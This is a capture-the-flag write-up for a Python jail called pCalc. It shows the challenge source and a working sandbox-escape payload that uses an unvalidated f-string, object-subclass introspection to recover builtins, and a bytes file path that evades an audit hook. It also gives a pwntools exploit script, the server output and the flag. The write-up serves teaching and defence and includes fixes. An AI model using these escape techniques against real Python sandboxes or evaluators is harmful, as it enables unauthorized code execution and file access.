# pCalc - Python Jail Escape

**CTF:** Pragyan CTF 2026
**Category:** Misc / Jail
**Difficulty:** Medium
**Points:** 100

**Flag:** `p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}`

---

## Challenge Description

```
Welcome to pCalc
+, -, *, and / are supported
```

The challenge presents a Python calculator with security restrictions (Python jail).

**Connection:**
```bash
ncat --ssl pcalc.ctf.prgy.in 1337
```

---

## Code Analysis

### Source Code (chal.py)

```python
#!/usr/bin/env python3
import ast
import sys
import os

def audit_hook(event, args):
    if event in ['os.system', 'os.popen', 'os.spawn', 'subprocess.Popen']:
        raise RuntimeError("Blocked Action Detected")

    if event == 'open' and isinstance(args[0], str) and 'flag' in args[0]:
        raise RuntimeError("Forbidden File Access")

sys.addaudithook(audit_hook)

class Calculator(ast.NodeVisitor):
    def __init__(self):
        self.is_valid = True

    def visit(self, node):
        if isinstance(node, (ast.Module, ast.Expr, ast.BinOp, ast.UnaryOp,
                             ast.Constant, ast.Name, ast.Load,
                             ast.operator, ast.unaryop)):
            super().visit(node)
        elif isinstance(node, ast.JoinedStr):     # ← f-strings allowed
            pass                                   # ← NOT recursively validated!
        else:
            print(f"Forbidden node type '{type(node).__name__}'")
            self.is_valid = False

def run_jail():
    print("Welcome to pCalc")
    print("+, -, *, and / are supported")

    user_input = input(">>> ")

    if "import" in user_input:
        print("'import' is a bad word.")
        return

    try:
        tree = ast.parse(user_input)
    except SyntaxError:
        print("Invalid Syntax")
        return

    validator = Calculator()
    validator.visit(tree)

    if not validator.is_valid:
        print("Expression rejected")
        return

    safe_globals = {"__builtins__": {}}         # ← empty builtins!
    try:
        result = eval(user_input, safe_globals)
        if isinstance(result, (int, float, complex)):
            print(result)
        else:
            print("Error: Calculator only supports numbers.")
    except Exception as e:
        print(f"Runtime Error: {e}")

run_jail()
```

### Security Restrictions

1. **Audit Hook:**
   - Blocks `os.system`, `os.popen`, `os.spawn`, `subprocess.Popen`
   - Blocks `open()` if the filename contains "flag"

2. **AST Whitelist:**
   - Only allows: `Module`, `Expr`, `BinOp`, `UnaryOp`, `Constant`, `Name`, `Load`, `operator`, `unaryop`
   - **Allows `JoinedStr` (f-strings) but does NOT validate its content recursively** ← BUG

3. **Empty Builtins:**
   - `{"__builtins__": {}}` - no `print`, `open`, `exec`, etc. available directly

4. **String Filter:**
   - The word "import" is blocked in the input

5. **Numbers Only:**
   - The result of `eval()` must be `int`, `float`, or `complex`

---

## Vulnerabilities: 3 Chained

### Vulnerability 1: F-string AST Bypass

```python
elif isinstance(node, ast.JoinedStr):
    pass  # ← BUG: Does NOT validate f-string content!
```

The validator allows `ast.JoinedStr` (f-strings) nodes but uses `pass` instead of `super().visit(node)`, which means it **does not recursively validate** the f-string content.

**Implication:** We can place **any Python code** inside an f-string, including:
- `ast.Call` (function calls)
- `ast.Attribute` (attribute access)
- `ast.Subscript` (indexing)
- Any arbitrary operation

### Vulnerability 2: Object Hierarchy to Rebuild Builtins

Although `__builtins__` is empty (`{"__builtins__": {}}`), we can rebuild access using object introspection:

```python
().__class__.__mro__[1].__subclasses__()
```

This provides access to all subclasses of `object`, some of which have `__init__.__globals__` containing the complete `__builtins__`.

**Access chain example:**
```python
# Get builtins from a subclass
().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__['__builtins__']
```

Index `118` corresponds to a class with access to builtins (may vary by Python version).

### Vulnerability 3: Bytes Path Audit Bypass (THE KEY)

The audit hook has a critical weakness in its validation:

```python
if event == 'open' and isinstance(args[0], str) and 'flag' in args[0]:
    raise RuntimeError("Forbidden File Access")
```

**Validation analysis:**
- `isinstance(args[0], str)` → Only checks if the argument is a **string**
- If we pass a **bytes** object, `isinstance(args[0], str)` returns `False`
- The complete AND condition fails → **NO exception is raised**

**Confirmed bypass:**
```python
open("flag.txt")   # [X] BLOCKED: isinstance(args[0], str) = True
open(b"flag.txt")  # [OK] BYPASS: isinstance(args[0], str) = False
```

Python accepts both `str` and `bytes` as paths in `open()`, but the audit hook only validates strings.

---

## Exploitation

### Strategy

1. **Vulnerability 1:** Use f-string to execute arbitrary code (content not validated)
2. **Vulnerability 2:** Rebuild access to `__builtins__` via object hierarchy introspection
3. **Vulnerability 3:** Use `bytes` path (`b"flag.txt"`) to bypass the audit hook
4. Exfiltrate the flag using `print()` as a side effect

### Verified Final Payload

```python
f'{().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__["__builtins__"]["print"](().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__["__builtins__"]["open"](b"flag.txt").read())}' + 0
```

**Payload breakdown:**

1. **Rebuild `print`:**
   ```python
   ().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__["__builtins__"]["print"]
   ```
   - `().__class__.__mro__[1]` → `object` class
   - `.__subclasses__()[118]` → subclass at index 118 (has `__init__.__globals__`)
   - `.__init__.__globals__["__builtins__"]["print"]` → `print` function from builtins

2. **Rebuild `open` with bytes path:**
   ```python
   ().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__["__builtins__"]["open"](b"flag.txt")
   ```
   - Similar to previous step to get `open`
   - **Key:** `b"flag.txt"` (bytes) instead of `"flag.txt"` (string)
   - The audit hook `isinstance(args[0], str)` returns `False` → **BYPASS**

3. **Read and display:**
   ```python
   .read()  # Read file contents
   ```
   - `print()` displays the flag as a side effect
   - `print()` returns `None`

4. **Force harmless error:**
   ```python
   + 0  # None + 0 → error, but flag already displayed
   ```

### Real Server Output

```
>>> [payload]
p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}
Runtime Error: can only concatenate str (not "int") to str
```

**Output analysis:**
- [OK] **Flag displayed:** `p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}`
- [!] **Expected error:** `can only concatenate str (not "int") to str`
  - This occurs because `print()` returns `None`, then the f-string converts `None` to `"None"`
  - When attempting `"None" + 0` the error is produced
  - **Doesn't matter:** The flag was already exfiltrated via stdout

### Why Other Bypasses Did NOT Work?

**[X] Dynamic concatenation:**
```python
open("fla" + "g.txt")  # The audit hook sees "flag.txt" after concatenation
```

**[X] chr() encoding:**
```python
open(chr(102)+chr(108)+chr(97)+chr(103)+...)  # The audit hook sees the final string
```

**[X] Wildcards:**
```python
open("fl*g.txt")  # The audit hook detects "flag" in the pattern
```

**[OK] Bytes path (THE SOLUTION):**
```python
open(b"flag.txt")  # isinstance(b"flag.txt", str) = False → BYPASS
```

---

## Final Exploit

### exploit.py

```python
#!/usr/bin/env python3
"""
pCalc - Python Jail Escape
Pragyan CTF 2026

Solution: 3 chained vulnerabilities
1. F-string AST bypass (not recursively validated)
2. Object hierarchy to rebuild builtins
3. Bytes path for audit hook bypass
"""
from pwn import *

HOST = 'pcalc.ctf.prgy.in'
PORT = 1337

def exploit():
    conn = remote(HOST, PORT, ssl=True)
    conn.recvuntil(b'>>> ')

    # Verified payload - 3 chained vulnerabilities
    # 1. Unvalidated f-string → arbitrary code
    # 2. Object hierarchy → recover builtins
    # 3. bytes path b"flag.txt" → bypass audit hook isinstance(args[0], str)
    payload = b'f\'{().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__["__builtins__"]["print"](().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__["__builtins__"]["open"](b"flag.txt").read())}\' + 0'

    log.info(f"Payload length: {len(payload)} bytes")
    log.info("Sending payload...")
    conn.sendline(payload)

    response = conn.recvall(timeout=2).decode()
    print(response)

    if 'p_ctf{' in response:
        flag = response[response.find('p_ctf{'):response.find('}', response.find('p_ctf{'))+1]
        log.success(f"FLAG: {flag}")
    else:
        log.failure("Flag not found in response")

    conn.close()

if __name__ == '__main__':
    exploit()
```

### Execution

```bash
python3 exploit.py
```

**Real server output:**
```
[*] Payload length: 265 bytes
[*] Sending payload...
p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}
Runtime Error: can only concatenate str (not "int") to str
[+] FLAG: p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}
```

---

## Lessons Learned

### 1. AST Validation Bypass via F-strings

**Lesson:** Always verify if allowed AST nodes are recursively validated.

```python
# Vulnerable code
elif isinstance(node, ast.JoinedStr):
    pass  # ← Does not validate content

# Secure code
elif isinstance(node, ast.JoinedStr):
    super().visit(node)  # ← Recursively validates
```

### 2. F-string as Escape Vector

F-strings (`ast.JoinedStr`) are a common escape vector in Python jails because:
- They can contain arbitrary expressions
- Their content is evaluated at runtime
- They are often mistakenly allowed in restrictive jails

### 3. Object Introspection to Rebuild Builtins

When `__builtins__` is empty, we can rebuild access:

```python
# Get all subclasses of object
subs = ().__class__.__mro__[1].__subclasses__()

# Find one with __init__.__globals__ containing __builtins__
for i, sub in enumerate(subs):
    try:
        if '__builtins__' in sub.__init__.__globals__:
            print(f"Index {i}: {sub}")
            builtins = sub.__init__.__globals__['__builtins__']
            break
    except:
        pass
```

**Typical access chain:**
```python
().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__['__builtins__']
```

### 4. **Bytes Path Audit Hook Bypass (CRITICAL)**

**Key lesson:** Python audit hooks can have weaknesses in type validation.

```python
# Vulnerable audit hook
if event == 'open' and isinstance(args[0], str) and 'flag' in args[0]:
    raise RuntimeError("Forbidden File Access")
```

**Confirmed bypass:**
```python
open("flag.txt")   # [X] BLOCKED: isinstance(args[0], str) = True
open(b"flag.txt")  # [OK] BYPASS: isinstance(args[0], str) = False
```

**Why it works:**
- Python accepts both `str` and `bytes` as paths in `open()`
- The audit hook only validates `str` with `isinstance(args[0], str)`
- `bytes` objects pass without validation
- **Applicable to other events:** `os.system(b"cmd")`, `subprocess.Popen([b"cmd"])`

**Secure code:**
```python
# Validate BOTH types
if event == 'open':
    path = args[0]
    if isinstance(path, bytes):
        path = path.decode('utf-8', errors='ignore')
    if isinstance(path, str) and 'flag' in path:
        raise RuntimeError("Forbidden File Access")
```

### 5. Side Effects for Exfiltration

When the result must be of a specific type, we use side effects:

```python
f'{print(data)}' + 0  # print() displays data, then error when adding None + 0
```

**Why it works:**
- `print()` returns `None`
- F-string converts `None` to `"None"`
- `"None" + 0` generates error, but the flag was already exfiltrated

### 6. AST Whitelist vs. Blacklist

This challenge uses an AST whitelist (only certain nodes allowed). To bypass:
- Look for allowed nodes that are not completely validated
- F-strings, list comprehensions, generator expressions are common vectors
- Always check if validation is recursive

### 7. Dynamic Concatenation Does NOT Bypass Audit Hooks

**Common mistake:**
```python
open("fla" + "g.txt")  # [X] The audit hook SEES "flag.txt" after concatenation
```

Audit hooks receive arguments **after being evaluated**, not the source code.

**Real solutions:**
- Use `bytes` path: `open(b"flag.txt")`
- Use `os.open()` with flags: `os.open("flag.txt", os.O_RDONLY)` (if not audited)
- Use file descriptors: `os.fdopen(3)` (if the fd is open)

---

## Solution Summary

**3 chained vulnerabilities:**

1. **F-string AST Bypass:**
   - `ast.JoinedStr` allowed but NOT recursively validated
   - Allows arbitrary code execution inside the f-string

2. **Object Hierarchy for Builtins:**
   - Empty `__builtins__`: `{"__builtins__": {}}`
   - Reconstruction via `().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__['__builtins__']`
   - Access to `print()` and `open()`

3. **Bytes Path Audit Bypass:**
   - Audit hook: `if isinstance(args[0], str) and 'flag' in args[0]`
   - `open(b"flag.txt")` → `isinstance(args[0], str)` = False → **BYPASS**
   - This was the key to reading the file

**Final payload (265 bytes):**
```python
f'{().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__["__builtins__"]["print"](().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__["__builtins__"]["open"](b"flag.txt").read())}' + 0
```

**Confirmed result:**
```
p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}
Runtime Error: can only concatenate str (not "int") to str
```

---

## Flag

```
p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}
```

---

## References

- [Python AST Documentation](https://docs.python.org/3/library/ast.html)
- [Python Audit Hooks (PEP 578)](https://peps.python.org/pep-0578/)
- [HackTricks - Python Jail Escape](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [Python f-string Format Specifications](https://docs.python.org/3/library/string.html#formatspec)
- [Python open() - Accepts bytes paths](https://docs.python.org/3/library/functions.html#open)
- [Type checking in Python - isinstance()](https://docs.python.org/3/library/functions.html#isinstance)

---

## PoC

### Exploit Execution

<img src="pcalc.png" alt="Exploit execution" width="800">

*Screenshot showing successful execution of the Python jail escape exploit and flag capture.*

---

**Date:** 2026-02-08
**CTF:** Pragyan CTF 2026
